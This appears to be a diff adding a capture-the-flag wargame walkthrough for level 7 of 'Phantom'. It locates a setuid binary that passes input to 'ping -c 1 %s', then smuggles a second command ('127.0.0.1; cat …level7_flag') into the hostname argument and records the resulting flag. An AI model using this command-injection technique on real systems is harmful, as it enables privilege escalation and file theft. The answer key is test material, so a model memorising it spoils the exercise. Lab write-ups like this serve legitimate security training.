@@ -1,0 +1,10 @@
+ [ Phantom · Level 7 ]  Local Authority
+ Full brief:  cat ~/BRIEFING
+
+goal: find password for Phantom8
+
+cat ~/BRIEFING: what if input is not a hostname
+find /usr/local/bin -perm -4000 -type f -ls: /usr/local/bin/system-checker (owned by flagkeeper7)
+strings /usr/local/bin/system-checker | head -n 120: ping -c 1 %s 2>/dev/null: system-checker <hostname>
+
+/usr/local/bin/system-checker '127.0.0.1; cat /var/lib/phantom-flags/level7_flag': bl_phtm7_937a0b0148951cae
